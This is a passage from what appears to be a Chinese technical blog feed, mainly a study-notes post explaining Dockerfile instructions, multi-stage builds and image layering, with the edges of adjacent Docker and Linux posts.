容器就可以共享一些基础的文件系统层，同时再加上自己独有的改动层，大大提高了存储的效率。</p><p>Docker 中使用的 AUFS（AnotherUnionFS）就是一种联合文件系统。 <code>AUFS</code> 支持为每一个成员目录（类似 Git 的分支）设定只读（readonly）、读写（readwrite）和写出（whiteout-able）权限, 同时 <code>AUFS</code> 里有一个类似分层的概念, 对只读权限的分支可以逻辑上进行增量地修改(不影响只读部分的)。</p><p>Docker 目前支持的联合文件系统包括 <code>OverlayFS</code>, <code>AUFS</code>, <code>Btrfs</code>, <code>VFS</code>, <code>ZFS</code> 和 <code>Device Mapper</code>。</p><p>各 Linux 发行版 Docker 推荐使用的存储驱动如下表。</p><table><thead><tr><th>Linux 发行版</th><th>Docker 推荐使用的存储驱动</th></tr></thead><tbody><tr><td>Docker CE on Ubuntu</td><td><code>aufs</code>, <code>devicemapper</code>, <code>overlay2</code> (Ubuntu 14.04.4 +, 16.04 +), <code>overlay</code>, <code>zfs</code>, <code>vfs</code></td></tr><tr><td>Docker CE on Debian</td><td><code>aufs</code>, <code>devicemapper</code>, <code>overlay2</code> (Debian Stretch), <code>overlay</code>, <code>vfs</code></td></tr><tr><td>Docker CE on CentOS</td><td><code>devicemapper</code>, <code>vfs</code></td></tr><tr><td>Docker CE on Fedora</td><td><code>devicemapper</code>, <code>overlay2</code> (Fedora 26 +), <code>overlay</code> (实验性支持), <code>vfs</code></td></tr></tbody></table><p>在可能的情况下，推荐使用 <code>overlay2</code> 存储驱动，<code>overlay2</code> 是目前 Docker 默认的存储驱动，以前则是 <code>aufs</code>。你可以通过配置来使用以上提到的其他类型的存储驱动。</p><h2 id="五、容器格式"><a href="#五、容器格式" class="headerlink" title="五、容器格式"></a>五、容器格式</h2><p>最初，Docker 采用了 <code>LXC</code> 中的容器格式。从 0.7 版本以后开始去除 LXC，转而使用自行开发的 <a href="https://github.com/docker/libcontainer">libcontainer</a>，从 1.11 开始，则进一步演进为使用 <a href="https://github.com/opencontainers/runc">runC</a> 和 <a href="https://containerd.tools/">containerd</a>。</p><p>对更多容器格式的支持，还在进一步的发展中。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记 - Docker镜像制作</title>
      <link href="/2017/10/10/docker-2/"/>
      <url>/2017/10/10/docker-2/</url>
      
        <content type="html"><![CDATA[<p>Dockerfile 是一种被 Docker 程序解释的脚本，由一条一条指令组成，本质是一组指令的集合。Dockerfile 有自己的命令格式，Docker 程序会读取 Dockerfile，并将这些指令翻译成 Linux 命令，根据命令制成相应的镜像文件，使用户清晰的了解镜像的制作过程；镜像的定制实际上就是定制每一层所添加的配置、文件，如果我们可以把每一层修改、安装、构建、操作的命令都写入一个脚本，用这个脚本来构建、定制镜像，那么无法重复的问题、镜像构建透明性的问题、体积的问题就都会解决。</p><h2 id="一、Dockerfile指令"><a href="#一、Dockerfile指令" class="headerlink" title="一、Dockerfile指令"></a>一、Dockerfile指令</h2><h3 id="1-1、FROM-指定基础镜像"><a href="#1-1、FROM-指定基础镜像" class="headerlink" title="1.1、FROM 指定基础镜像"></a>1.1、FROM 指定基础镜像</h3><p>所谓定制镜像，那一定是以一个镜像为基础，在其上进行定制。而 <code>FROM</code> 就是指定<strong>基础镜像</strong>，因此一个 <code>Dockerfile</code> 中 <code>FROM</code> 是必备的指令，并且必须是第一条指令。</p><p>除了选择现有镜像为基础镜像外，Docker 还存在一个特殊的镜像，名为 <code>scratch</code>。这个镜像是虚拟的概念，并不实际存在，它表示一个空白的镜像。如果你以 <code>scratch</code> 为基础镜像的话，意味着你不以任何镜像为基础，接下来所写的指令将作为镜像第一层开始存在。</p><p>不以任何系统为基础，直接将可执行文件复制进镜像的做法并不罕见，比如 <a href="https://hub.docker.com/_/swarm/"><code>swarm</code></a>、<a href="https://quay.io/repository/coreos/etcd"><code>coreos/etcd</code></a>。对于 Linux 下静态编译的程序来说，并不需要有操作系统提供运行时支持，所需的一切库都已经在可执行文件里了，因此直接 <code>FROM scratch</code> 会让镜像体积更加小巧。使用 <a href="https://golang.org/">Go 语言</a> 开发的应用很多会使用这种方式来制作镜像，这也是为什么有人认为 Go 是特别适合容器微服务架构的语言的原因之一。</p><h3 id="1-2、RUN-执行命令"><a href="#1-2、RUN-执行命令" class="headerlink" title="1.2、RUN 执行命令"></a>1.2、RUN 执行命令</h3><p><code>RUN</code> 指令是用来执行命令行命令的。由于命令行的强大能力，<code>RUN</code> 指令在定制镜像时是最常用的指令之一。其格式有两种：</p><ul><li><code>shell格式</code>：<code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样。刚才写的 Dockerfile 中的 <code>RUN</code> 指令就是这种格式；</li><li><code>exec格式</code>：<code>RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]</code>，这更像是函数调用中的格式;</li></ul><p>Dockerfile 中每一个指令都会建立一层，<code>RUN</code> 也不例外。每一个 <code>RUN</code> 的行为，都会新建立一层，在其上执行这些命令，执行结束后，<code>commit</code> 这一层的修改，构成新的镜像，所以建议多个指令使用一个<code>RUN</code>命令执行；</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> debian:jessie<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> buildDeps=<span class="hljs-string">&#x27;gcc libc6-dev make&#x27;</span> s\</span><br><span class="language-bash">    &amp;&amp; apt-get update \</span><br><span class="language-bash">    &amp;&amp; apt-get install -y buildDeps</span><br></code></pre></td></tr></table></figure><h3 id="1-3、COPY-复制文件"><a href="#1-3、COPY-复制文件" class="headerlink" title="1.3、COPY 复制文件"></a>1.3、COPY 复制文件</h3><ul><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;... &lt;目标路径&gt;</code></li><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></li></ul><p>和 <code>RUN</code> 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用。<code>COPY</code> 指令将从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件&#x2F;目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置。</p><p><code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> 规则；</p><p><code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 <code>WORKDIR</code>指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。</p><p>使用 <code>COPY</code> 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。</p><h3 id="1-4、ADD-更高级的复制文件"><a href="#1-4、ADD-更高级的复制文件" class="headerlink" title="1.4、ADD 更高级的复制文件"></a>1.4、ADD 更高级的复制文件</h3><p><code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致。但是在 <code>COPY</code> 基础上增加了一些功能。比如 <code>&lt;源路径&gt;</code> 可以是一个 <code>URL</code>，这种情况下，Docker 引擎会试图去下载这个链接的文件放到 <code>&lt;目标路径&gt;</code> 去。下载后的文件权限自动设置为 <code>600</code>，如果 <code>&lt;源路径&gt;</code> 为一个 <code>tar</code> 压缩文件的话，压缩格式为 <code>gzip</code>, <code>bzip2</code> 以及 <code>xz</code> 的情况下，<code>ADD</code> 指令将会自动解压缩这个压缩文件到 <code>&lt;目标路径&gt;</code> 去。</p><p>在 Docker 官方的 <a href="https://yeasy.gitbooks.io/docker_practice/appendix/best_practices.html">Dockerfile 最佳实践文档</a> 中要求，尽可能的使用 <code>COPY</code>，因为 <code>COPY</code> 的语义很明确，就是复制文件而已，而 <code>ADD</code> 则包含了更复杂的功能，其行为也不一定很清晰。最适合使用 <code>ADD</code> 的场合，就是所提及的需要自动解压缩的场合。</p><p><code>ADD</code> 指令会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢，因此在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</p><p>在使用该指令的时候还可以加上 <code>--chown=&lt;user&gt;:&lt;group&gt;</code> 选项来改变文件的所属用户及所属组。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">ADD</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=55:mygroup files* /mydir/</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=bin files* /mydir/</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=1 files* /mydir/</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> --<span class="hljs-built_in">chown</span>=10:11 files* /mydir/</span><br></code></pre></td></tr></table></figure><h3 id="1-5、CMD-容器启动命令"><a href="#1-5、CMD-容器启动命令" class="headerlink" title="1.5、CMD 容器启动命令"></a>1.5、CMD 容器启动命令</h3><p><code>CMD</code> 指令就是用于指定默认的容器主进程的启动命令的，<code>CMD</code> 指令的格式和 <code>RUN</code> 相似，也是两种格式：</p><ul><li><code>shell</code> 格式：<code>CMD &lt;命令&gt;</code></li><li><code>exec</code> 格式：<code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code></li></ul><p>在指令格式上，一般推荐使用 <code>exec</code> 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 <code>&quot;</code>，而不要使用单引号。</p><p>Docker 不是虚拟机，容器中的应用都应该以前台执行，而不是像虚拟机、物理机里面那样，用 upstart&#x2F;systemd 去启动后台服务，容器内没有后台服务的概念。对于容器而言，其启动程序就是容器应用进程，容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。</p><p>使用 <code>service nginx start</code> 命令，是希望 upstart 来以后台守护进程形式启动 <code>nginx</code> 服务。而刚才说了 <code>CMD service nginx start</code> 会被理解为 <code>CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;service nginx start&quot;]</code>，因此主进程实际上是 <code>sh</code>。那么当 <code>service nginx start</code> 命令结束后，<code>sh</code> 也就结束了，<code>sh</code> 作为主进程退出了，自然就会令容器退出。</p><p>正确的做法是直接执行 <code>nginx</code> 可执行文件，并且要求以前台形式运行。比如：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h3 id="1-6、ENTRYPOINT-入口点"><a href="#1-6、ENTRYPOINT-入口点" class="headerlink" title="1.6、ENTRYPOINT 入口点"></a>1.6、ENTRYPOINT 入口点</h3><p><code>ENTRYPOINT</code> 的格式和 <code>RUN</code> 指令格式一样，分为 <code>exec</code> 格式和 <code>shell</code> 格式。<code>ENTRYPOINT</code> 的目的和 <code>CMD</code> 一样，都是在指定容器启动程序及参数。<code>ENTRYPOINT</code> 在运行时也可以替代，不过比 <code>CMD</code> 要略显繁琐，需要通过 <code>docker run</code> 的参数 <code>--entrypoint</code> 来指定。</p><p>当指定了 <code>ENTRYPOINT</code> 后，<code>CMD</code> 的含义就发生了改变，不再是直接的运行其命令，而是将 <code>CMD</code> 的内容作为参数传给 <code>ENTRYPOINT</code> 指令，换句话说实际执行时，将变为：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile">&lt;<span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash">&gt; <span class="hljs-string">&quot;&lt;CMD&gt;&quot;</span></span><br></code></pre></td></tr></table></figure><h3 id="1-7、ENV-设置环境变量"><a href="#1-7、ENV-设置环境变量" class="headerlink" title="1.7、ENV 设置环境变量"></a>1.7、ENV 设置环境变量</h3><p>两种格式：</p><ul><li><code>ENV &lt;key&gt; &lt;value&gt;</code></li><li><code>ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</code></li></ul><p>这个指令很简单，就是设置环境变量而已，无论是后面的其它指令，如 <code>RUN</code>，还是运行时的应用，都可以直接使用这里定义的环境变量。</p><p>下列指令可以支持环境变量展开： <code>ADD</code>、<code>COPY</code>、<code>ENV</code>、<code>EXPOSE</code>、<code>LABEL</code>、<code>USER</code>、<code>WORKDIR</code>、<code>VOLUME</code>、<code>STOPSIGNAL</code>、<code>ONBUILD</code></p><h3 id="1-8、ARG-构建参数"><a href="#1-8、ARG-构建参数" class="headerlink" title="1.8、ARG 构建参数"></a>1.8、ARG 构建参数</h3><p>格式：<code>ARG &lt;参数名&gt;[=&lt;默认值&gt;]</code></p><p>构建参数和 <code>ENV</code> 的效果一样，都是设置环境变量。所不同的是，<code>ARG</code> 所设置的是构建环境的环境变量，在将来容器运行时是不会存在这些环境变量的。但是不要因此就使用 <code>ARG</code> 保存密码之类的信息，因为 <code>docker history</code> 还是可以看到所有值的。</p><p><code>Dockerfile</code> 中的 <code>ARG</code> 指令是定义参数名称，以及定义其默认值。该默认值可以在构建命令 <code>docker build</code> 中用 <code>--build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖。</p><p>在 1.13 之前的版本，要求 <code>--build-arg</code> 中的参数名，必须在 <code>Dockerfile</code> 中用 <code>ARG</code> 定义过了，换句话说，就是 <code>--build-arg</code> 指定的参数，必须在 <code>Dockerfile</code> 中使用了。如果对应参数没有被使用，则会报错退出构建。从 1.13 开始，这种严格的限制被放开，不再报错退出，而是显示警告信息，并继续构建。这对于使用 CI 系统，用同样的构建流程构建不同的 <code>Dockerfile</code> 的时候比较有帮助，避免构建命令必须根据每个 Dockerfile 的内容修改。</p><h3 id="1-9、VOLUME-定义匿名卷"><a href="#1-9、VOLUME-定义匿名卷" class="headerlink" title="1.9、VOLUME 定义匿名卷"></a>1.9、VOLUME 定义匿名卷</h3><p>格式为：</p><ul><li><code>VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]</code></li><li><code>VOLUME &lt;路径&gt;</code></li></ul><p>之前我们说过，容器运行时应该尽量保持容器存储层不发生写操作，对于数据库类需要保存动态数据的应用，其数据库文件应该保存于卷(volume)中，后面的章节我们会进一步介绍 Docker 卷的概念。为了防止运行时用户忘记将动态文件所保存目录挂载为卷，在 <code>Dockerfile</code> 中，我们可以事先指定某些目录挂载为匿名卷，这样在运行时如果用户不指定挂载，其应用也可以正常运行，不会向容器存储层写入大量数据。这里的 <code>/data</code> 目录就会在运行时自动挂载为匿名卷，任何向 <code>/data</code> 中写入的信息都不会记录进容器存储层，从而保证了容器存储层的无状态化。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">VOLUME</span><span class="language-bash"> /data</span><br></code></pre></td></tr></table></figure><h3 id="1-10、EXPOSE-声明端口"><a href="#1-10、EXPOSE-声明端口" class="headerlink" title="1.10、EXPOSE 声明端口"></a>1.10、EXPOSE 声明端口</h3><p>格式为 <code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code>。</p><p><code>EXPOSE</code> 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 <code>docker run -P</code>时，会自动随机映射 <code>EXPOSE</code> 的端口。</p><p>要将 <code>EXPOSE</code> 和在运行时使用 <code>-p &lt;宿主端口&gt;:&lt;容器端口&gt;</code> 区分开来。<code>-p</code>，是映射宿主端口和容器端口，换句话说，就是将容器的对应端口服务公开给外界访问，而 <code>EXPOSE</code> 仅仅是声明容器打算使用什么端口而已，并不会自动在宿主进行端口映射。</p><h3 id="1-11、WORKDIR-指定工作目录"><a href="#1-11、WORKDIR-指定工作目录" class="headerlink" title="1.11、WORKDIR 指定工作目录"></a>1.11、WORKDIR 指定工作目录</h3><p>格式为 <code>WORKDIR &lt;工作目录路径&gt;</code></p><p>使用 <code>WORKDIR</code> 指令可以来指定工作目录（或者称为当前目录），以后各层的当前目录就被改为指定的目录，如该目录不存在，<code>WORKDIR</code> 会帮你建立目录。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /app</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello&quot;</span> &gt; world.txt</span><br></code></pre></td></tr></table></figure><p>如果将上面的 <code>Dockerfile</code> 进行构建镜像运行后，会发现找不到 <code>/app/world.txt</code> 文件，或者其内容不是 <code>hello</code>。原因其实很简单，在 Shell 中，连续两行是同一个进程执行环境，因此前一个命令修改的内存状态，会直接影响后一个命令；而在 <code>Dockerfile</code> 中，这两行 <code>RUN</code> 命令的执行环境根本不同，是两个完全不同的容器。这就是对 <code>Dockerfile</code> 构建分层存储的概念不了解所导致的错误。</p><p>之前说过每一个 <code>RUN</code> 都是启动一个容器、执行命令、然后提交存储层文件变更。第一层 <code>RUN cd /app</code> 的执行仅仅是当前进程的工作目录变更，一个内存上的变化而已，其结果不会造成任何文件变更。而到第二层的时候，启动的是一个全新的容器，跟第一层的容器更完全没关系，自然不可能继承前一层构建过程中的内存变化。</p><p>因此如果需要改变以后各层的工作目录的位置，那么应该使用 <code>WORKDIR</code> 指令。</p><h3 id="1-12、USER-指定当前用户"><a href="#1-12、USER-指定当前用户" class="headerlink" title="1.12、USER 指定当前用户"></a>1.12、USER 指定当前用户</h3><p>格式：<code>USER &lt;用户名&gt;[:&lt;用户组&gt;]</code></p><p><code>USER</code> 指令和 <code>WORKDIR</code> 相似，都是改变环境状态并影响以后的层。<code>WORKDIR</code> 是改变工作目录，<code>USER</code>则是改变之后层的执行 <code>RUN</code>, <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。</p><p>当然，和 <code>WORKDIR</code> 一样，<code>USER</code> 只是帮助你切换到指定用户而已，这个用户必须是事先建立好的，否则无法切换。</p><p>如果以 <code>root</code> 执行的脚本，在执行期间希望改变身份，比如希望以某个已经建立好的用户来运行某个服务进程，不要使用 <code>su</code> 或者 <code>sudo</code>，这些都需要比较麻烦的配置，而且在 TTY 缺失的环境下经常出错。建议使用 <a href="https://github.com/tianon/gosu"><code>gosu</code></a>。</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-comment"># 建立 redis 用户，并使用 gosu 换另一个用户执行命令</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br><span class="hljs-comment"># 下载 gosu</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -O /usr/local/bin/gosu <span class="hljs-string">&quot;https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64&quot;</span> \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">chmod</span> +x /usr/local/bin/gosu \</span><br><span class="language-bash">    &amp;&amp; gosu nobody <span class="hljs-literal">true</span></span><br><span class="hljs-comment"># 设置 CMD，并以另外的用户执行</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [ <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;gosu&quot;</span>, <span class="hljs-string">&quot;redis&quot;</span>, <span class="hljs-string">&quot;redis-server&quot;</span> ]</span><br></code></pre></td></tr></table></figure><h3 id="1-13、HEALTHCHECK-健康检查"><a href="#1-13、HEALTHCHECK-健康检查" class="headerlink" title="1.13、HEALTHCHECK 健康检查"></a>1.13、HEALTHCHECK 健康检查</h3><p>格式：</p><ul><li><code>HEALTHCHECK [选项] CMD &lt;命令&gt;</code>：设置检查容器健康状况的命令</li><li><code>HEALTHCHECK NONE</code>：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令</li></ul><p><code>HEALTHCHECK</code> 指令是告诉 Docker 应该如何进行判断容器的状态是否正常，这是 Docker 1.12 引入的新指令。在没有 <code>HEALTHCHECK</code> 指令前，Docker 引擎只可以通过容器内主进程是否退出来判断容器是否状态异常。很多情况下这没问题，但是如果程序进入死锁状态，或者死循环状态，应用进程并不退出，但是该容器已经无法提供服务了。在 1.12 以前，Docker 不会检测到容器的这种状态，从而不会重新调度，导致可能会有部分容器已经无法提供服务了却还在接受用户请求。而自 1.12 之后，Docker 提供了 <code>HEALTHCHECK</code> 指令，通过该指令指定一行命令，用这行命令来判断容器主进程的服务状态是否还正常，从而比较真实的反应容器实际状态。当在一个镜像指定了 <code>HEALTHCHECK</code> 指令后，用其启动容器，初始状态会为 <code>starting</code>，在 <code>HEALTHCHECK</code> 指令检查成功后变为 <code>healthy</code>，如果连续一定次数失败，则会变为 <code>unhealthy</code>。</p><p><code>HEALTHCHECK</code> 支持下列选项：</p><ul><li><code>--interval=&lt;间隔&gt;</code>：两次健康检查的间隔，默认为 30 秒；</li><li><code>--timeout=&lt;时长&gt;</code>：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；</li><li><code>--retries=&lt;次数&gt;</code>：当连续失败指定次数后，则将容器状态视为 <code>unhealthy</code>，默认 3 次。</li></ul><p>和 <code>CMD</code>, <code>ENTRYPOINT</code> 一样，<code>HEALTHCHECK</code> 只可以出现一次，如果写了多个，只有最后一个生效。在 <code>HEALTHCHECK [选项] CMD</code> 后面的命令，格式和 <code>ENTRYPOINT</code> 一样，分为 <code>shell</code> 格式，和 <code>exec</code> 格式。命令的返回值决定了该次健康检查的成功与否：<code>0</code>：成功；<code>1</code>：失败；<code>2</code>：保留，不要使用这个值。</p><p>当运行该镜像后，可以通过 <code>docker container ls</code> 看到容器的状态。</p><h3 id="1-14、ONBUILD-为他人做嫁衣裳"><a href="#1-14、ONBUILD-为他人做嫁衣裳" class="headerlink" title="1.14、ONBUILD 为他人做嫁衣裳"></a>1.14、ONBUILD 为他人做嫁衣裳</h3><p>格式：<code>ONBUILD &lt;其它指令&gt;</code>。</p><p><code>ONBUILD</code> 是一个特殊的指令，它后面跟的是其它指令，比如 <code>RUN</code>, <code>COPY</code> 等，而这些指令，在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像，去构建下一级镜像的时候才会被执行。</p><p><code>Dockerfile</code> 中的其它指令都是为了定制当前镜像而准备的，唯有 <code>ONBUILD</code> 是为了帮助别人定制自己而准备的。</p><h2 id="二、其他构建镜像的方式"><a href="#二、其他构建镜像的方式" class="headerlink" title="二、其他构建镜像的方式"></a>二、其他构建镜像的方式</h2><h3 id="2-1、多阶段构建"><a href="#2-1、多阶段构建" class="headerlink" title="2.1、多阶段构建"></a>2.1、多阶段构建</h3><p>在 Docker 17.05 版本之前，我们构建 Docker 镜像时，通常会采用两种方式：</p><ul><li><p>全部放入一个 Dockerfile进行构建；</p></li><li><p>分散到多个 Dockerfile进行构建；</p></li></ul><blockquote><p>全部放入一个 Dockerfile</p></blockquote><p>这种方式中，一个 <code>Dockerfile</code> 中将会包括项目及其依赖库的编译、测试、打包等流程，这里可能会带来的一些问题：</p><ul><li><code>Dockerfile</code> 特别长，可维护性降低</li><li>镜像层次多，镜像体积较大，部署时间变长</li><li>源代码存在泄露的风险</li></ul><blockquote><p>分散到多个 Dockerfile</p></blockquote><p>另一种方式，就是我们事先在一个 <code>Dockerfile</code> 将项目及其依赖库编译测试打包好后，再将其拷贝到运行环境中，这种方式需要我们编写两个 <code>Dockerfile</code> 和一些编译脚本才能将其两个阶段自动整合起来，这种方式虽然可以很好地规避第一种方式存在的风险，但明显部署过程较复杂。</p><h4 id="2-1-1、使用多阶段构建"><a href="#2-1-1、使用多阶段构建" class="headerlink" title="2.1.1、使用多阶段构建:"></a>2.1.1、使用多阶段构建:</h4><p>为解决以上问题，Docker v17.05 开始支持多阶段构建 (<code>multistage builds</code>)。使用多阶段构建我们就可以很容易解决前面提到的问题，并且只需要编写一个 <code>Dockerfile</code>：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.9</span>-alpine as builder<br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk --no-cache add git</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/go/helloworld/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go get -d -v github.com/go-sql-driver/mysql</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> app.go .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span><br><br><span class="hljs-keyword">FROM</span> alpine:latest as prod<br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=0 /go/src/github.com/go/helloworld/app .</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;./app&quot;</span>]</span><br></code></pre></td></tr></table></figure><ul><li><p>多阶段命名：可以使用 <code>as</code> 来为某一阶段命名，例如：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.9</span>-alpine as builder<br></code></pre></td></tr></table></figure></li><li><p>构建时从其他镜像复制文件：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="2-2、从-rootfs-压缩包导入构建"><a href="#2-2、从-rootfs-压缩包导入构建" class="headerlink" title="2.2、从 rootfs 压缩包导入构建"></a>2.2、从 rootfs 压缩包导入构建</h3><p>除了标准的使用 <code>Dockerfile</code> 生成镜像的方法外，由于各种特殊需求和历史原因，还提供了一些其它方法用以生成镜像。</p><p>格式：<code>docker import [选项] &lt;文件&gt;|&lt;URL&gt;|- [&lt;仓库名&gt;[:&lt;标签&gt;]]</code></p><p>压缩包可以是本地文件、远程 Web 文件，甚至是从标准输入中得到。压缩包将会在镜像 <code>/</code> 目录展开，并直接作为镜像第一层提交。</p><p>比如我们想要创建一个 <a href="https://openvz.org/Main_Page">OpenVZ</a> 的 Ubuntu 14.04 <a href="https://openvz.org/Download/template/precreated">模板</a>的镜像：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker import \<br>    http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64-minimal.tar.gz \<br>    openvz/ubuntu:14.04<br></code></pre></td></tr></table></figure><p>这条命令自动下载了 <code>ubuntu-14.04-x86_64-minimal.tar.gz</code> 文件，并且作为根文件系统展开导入，并保存为镜像 <code>openvz/ubuntu:14.04</code>。</p><h2 id="三、镜像的实现原理"><a href="#三、镜像的实现原理" class="headerlink" title="三、镜像的实现原理"></a>三、镜像的实现原理</h2><p>Docker 镜像是怎么实现增量的修改和维护的？</p><p>每个镜像都由很多层次构成，Docker 使用 <a href="http://en.wikipedia.org/wiki/UnionFS">Union FS</a> 将这些不同的层结合到一个镜像中去。</p><p>通常 Union FS 有两个用途, 一方面可以实现不借助 LVM、RAID 将多个 disk 挂到同一个目录下,另一个更常用的就是将一个只读的分支和一个可写的分支联合在一起，Live CD 正是基于此方法可以允许在镜像不变的基础上允许用户在其上进行一些写操作。</p><p>Docker 在 AUFS 上构建的容器也是利用了类似的原理。</p><p><strong>参考文档：</strong></p><ul><li><code>使用 Dockerfile 定制镜像</code>：<a href="https://yeasy.gitbooks.io/docker_practice/image/build.html">https://yeasy.gitbooks.io/docker_practice/image/build.html</a></li><li><code>Dockerfie</code> 官方文档：<a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></li><li><code>Dockerfile</code> 最佳实践文档：<a href="https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/">https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/</a></li><li><code>Docker</code> 官方镜像 <code>Dockerfile</code>：<a href="https://github.com/docker-library/docs">https://github.com/docker-library/docs</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux进程的状态解析</title>
      <link href="/2017/10/10/linux-process-state/"/>
      <url>/2017/10/10/linux-process-state/</url>
      
